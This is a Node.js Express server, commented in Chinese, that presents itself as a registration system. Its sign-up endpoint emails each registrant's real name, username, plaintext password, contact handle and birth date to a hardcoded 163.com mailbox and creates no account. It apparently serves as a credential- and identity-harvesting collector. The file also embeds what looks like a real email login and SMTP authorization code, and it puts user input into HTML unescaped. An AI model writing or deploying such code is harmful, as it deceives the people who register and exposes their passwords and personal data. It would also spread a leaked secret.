const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ========== 网易163邮箱配置 ==========
const EMAIL_USER = '13760088720@163.com';   // 👈 改成你的163邮箱
const EMAIL_PASS = 'DNTLwr9qLT7bkPCF';          // 👈 改成网易授权码
const TARGET_EMAIL = '13760088720@163.com';     // 接收邮箱
// ====================================

console.log(`📧 发件邮箱: ${EMAIL_USER}`);
console.log(`📧 目标邮箱: ${TARGET_EMAIL}`);

// 网易163 SMTP 配置
const transporter = nodemailer.createTransport({
    host: 'smtp.163.com',
    port: 465,
    secure: true,
    auth: {
        user: EMAIL_USER,
        pass: EMAIL_PASS
    },
    // 增加超时时间，避免网络问题
    connectionTimeout: 30000,
    greetingTimeout: 30000,
    socketTimeout: 30000
});

// 验证邮件配置（启动时测试）
transporter.verify((error, success) => {
    if (error) {
        console.error('❌ 邮箱配置验证失败:', error.message);
    } else {
        console.log('✅ 邮箱配置验证成功，可以正常发信');
    }
});

// 注册接口
app.post('/api/register', async (req, res) => {
    const { realname, username, password, contact, birthDate } = req.body;
    
    if (!realname || !username || !password || !contact || !birthDate) {
        return res.json({ success: false, message: '请填写所有字段' });
    }
    
    const mailOptions = {
        from: `"注册系统" <${EMAIL_USER}>`,
        to: TARGET_EMAIL,
        subject: `【新用户注册】${username} - ${new Date().toLocaleString()}`,
        html: `
            <div style="font-family: system-ui; padding: 20px; border: 1px solid #ddd; border-radius: 12px;">
                <h2 style="color: #1e3a5f;">📝 新用户注册通知</h2>
                <p><strong>真实姓名：</strong> ${realname}</p>
                <p><strong>账户名：</strong> ${username}</p>
                <p><strong>出生年月日：</strong> ${birthDate}</p>
                <p><strong>QQ/微信号：</strong> ${contact}</p>
                <p><strong>密码：</strong> ${password}</p>
                <p><strong>注册时间：</strong> ${new Date().toLocaleString('zh-CN')}</p>
                <hr>
                <small>此邮件由注册系统自动发送</small>
            </div>
        `
    };
    
    try {
        await transporter.sendMail(mailOptions);
        console.log(`✅ 邮件发送成功: ${username}`);
        res.json({ success: true, message: '注册成功' });
    } catch (error) {
        console.error('❌ 邮件发送失败:', error.message);
        res.json({ success: false, message: '邮件发送失败: ' + error.message });
    }
});

// 健康检查
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`✅ 服务器运行在端口 ${port}`);
});
